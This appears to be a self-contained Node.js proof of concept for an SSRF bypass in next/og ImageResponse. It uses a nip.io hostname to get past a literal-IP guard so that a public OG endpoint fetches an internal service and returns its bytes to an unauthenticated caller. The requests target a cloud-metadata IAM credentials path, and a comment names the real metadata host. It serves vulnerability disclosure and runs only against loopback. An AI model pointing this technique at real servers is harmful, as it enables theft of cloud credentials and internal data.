// END-TO-END SSRF CHAIN PoC — Finding H7 (next/og ImageResponse).
//
// Two real HTTP servers:
//   * PUBLIC  — a faithful Next OG route: `GET /api/og?img=<url>` reads the query
//               param and returns `new ImageResponse(<img src={img}/>)`. This is
//               exactly what an app/api/og/route.tsx does. Uses the SHIPPED
//               vendored @vercel/og bundle.
//   * INTERNAL— stands in for an internal-only service / cloud metadata endpoint
//               the public server must never reach from user input. Bound to
//               loopback; returns a per-run "secret" image and logs every hit.
//
// An unauthenticated request to the PUBLIC endpoint, with an attacker-chosen
// `img` host that the next/og "SSRF protection" guard ALLOWS (a non-literal-IP
// hostname that DNS-resolves to the internal address), makes the public server
// fetch the internal service and return its bytes to the attacker.
//
// DEFENSIVE: the internal target is our own loopback server (127.0.0.1.nip.io).
// Swapping the host to 169.254.169.254.nip.io would hit real cloud metadata —
// we deliberately do NOT.
import http from 'node:http'
import zlib from 'node:zlib'
import crypto from 'node:crypto'
import { fileURLToPath } from 'node:url'

const OG = fileURLToPath(
  new URL('../packages/next/src/compiled/@vercel/og/index.node.js', import.meta.url)
)
const { ImageResponse } = await import(OG)

// --- minimal valid PNG encoder (solid WxH, RGB) so the "internal secret" is a real image ---
const CRC = (() => {
  const t = new Int32Array(256)
  for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; t[n] = c }
  return (buf) => { let c = ~0; for (let i = 0; i < buf.length; i++) c = t[(c ^ buf[i]) & 0xff] ^ (c >>> 8); return ~c >>> 0 }
})()
function pngChunk(type, data) {
  const len = Buffer.alloc(4); len.writeUInt32BE(data.length, 0)
  const td = Buffer.concat([Buffer.from(type, 'ascii'), data])
  const crc = Buffer.alloc(4); crc.writeUInt32BE(CRC(td), 0)
  return Buffer.concat([len, td, crc])
}
function solidPng(w, h, [r, g, b]) {
  const ihdr = Buffer.alloc(13)
  ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2 // 8-bit RGB
  const px = Buffer.from([r, g, b])
  const row = Buffer.concat([Buffer.from([0]), ...Array.from({ length: w }, () => px)])
  const raw = Buffer.concat(Array.from({ length: h }, () => row))
  return Buffer.concat([
    Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]),
    pngChunk('IHDR', ihdr), pngChunk('IDAT', zlib.deflateSync(raw)), pngChunk('IEND', Buffer.alloc(0)),
  ])
}

// ---- INTERNAL service (loopback) ----
let internalSecretColor = [255, 0, 0]
let internalHits = []
const internal = http.createServer((req, res) => {
  internalHits.push(req.url)
  console.log(`   [INTERNAL 127.0.0.1] served internal-only resource ${JSON.stringify(req.url)} to the OG server`)
  res.setHeader('content-type', 'image/png')
  res.end(solidPng(120, 120, internalSecretColor)) // the "secret" the attacker should never get
})
await new Promise((r) => internal.listen(0, '127.0.0.1', r))
const iPort = internal.address().port

// ---- PUBLIC OG endpoint (the app) ----
const publicSrv = http.createServer(async (req, res) => {
  const u = new URL(req.url, 'http://localhost')
  if (u.pathname !== '/api/og') { res.statusCode = 404; return res.end('not found') }
  const img = u.searchParams.get('img') // <-- request-controlled, as in a real dynamic-OG route
  const element = {
    type: 'div',
    props: {
      style: { display: 'flex', width: '100%', height: '100%' },
      children: { type: 'img', props: { src: img, width: 200, height: 200 } },
    },
  }
  try {
    const buf = Buffer.from(await new ImageResponse(element, { width: 200, height: 200 }).arrayBuffer())
    res.setHeader('content-type', 'image/png'); res.end(buf)
  } catch (e) {
    res.statusCode = 500; res.end('render error: ' + String(e).split('\n')[0])
  }
})
await new Promise((r) => publicSrv.listen(0, '127.0.0.1', r))
const pPort = publicSrv.address().port

// tiny HTTP client returning {status, body}
function get(url) {
  return new Promise((resolve, reject) => {
    http.get(url, (res) => { const c = []; res.on('data', (d) => c.push(d)); res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(c) })) }).on('error', reject)
  })
}
const sha = (b) => crypto.createHash('sha256').update(b).digest('hex').slice(0, 16)

console.log(`PUBLIC OG endpoint : http://127.0.0.1:${pPort}/api/og`)
console.log(`INTERNAL service   : http://127.0.0.1:${iPort}/  (loopback; stands in for cloud metadata)\n`)

// The attacker-supplied img host: a guard-ALLOWED hostname resolving to the internal service.
const internalUrl = (path) => `http://127.0.0.1.nip.io:${iPort}${path}`

// === ATTACK A: internal secret is RED ===
internalSecretColor = [220, 20, 20]; internalHits = []
const atkUrlRed = `http://127.0.0.1:${pPort}/api/og?img=${encodeURIComponent(internalUrl('/latest/meta-data/iam/security-credentials/admin'))}`
console.log('attacker (unauth) ->', atkUrlRed)
const aRed = await get(atkUrlRed)
console.log(`   public endpoint returned HTTP ${aRed.status}, ${aRed.body.length}-byte PNG (sha ${sha(aRed.body)})`)
const reachedRed = internalHits.length > 0

// === ATTACK B: same attack, internal secret is BLUE ===
internalSecretColor = [20, 20, 220]; internalHits = []
const aBlue = await get(`http://127.0.0.1:${pPort}/api/og?img=${encodeURIComponent(internalUrl('/latest/meta-data/iam/security-credentials/admin'))}`)
console.log(`   (internal secret changed to BLUE) public endpoint returned ${aBlue.body.length}-byte PNG (sha ${sha(aBlue.body)})`)

// === CONTROL: literal internal IP (what the guard is supposed to stop) ===
internalHits = []
const ctrl = await get(`http://127.0.0.1:${pPort}/api/og?img=${encodeURIComponent(`http://127.0.0.1:${iPort}/latest/meta-data/`)}`)
console.log(`\ncontrol (literal 127.0.0.1) -> HTTP ${ctrl.status}: ${ctrl.status === 500 ? ctrl.body.toString().slice(0, 70) : 'rendered'}; internal reached: ${internalHits.length > 0}`)

console.log('\n================ VERDICT ================')
console.log('SSRF reach (public endpoint -> internal-only service):', reachedRed ? 'YES' : 'no')
console.log('Guard blocks the literal-IP control                  :', ctrl.status === 500 && internalHits.length === 0 ? 'YES (so the guard IS active — and the hostname bypasses it)' : 'no')
console.log('Internal CONTENT exfiltrated to the attacker         :', aRed.status === 200 && aBlue.status === 200 && sha(aRed.body) !== sha(aBlue.body)
  ? 'YES — the two attacker responses differ because they embed the RED vs BLUE internal image; the internal resource\'s bytes flow back to the unauthenticated caller.'
  : 'inconclusive')
console.log('=========================================')
internal.close(); publicSrv.close()
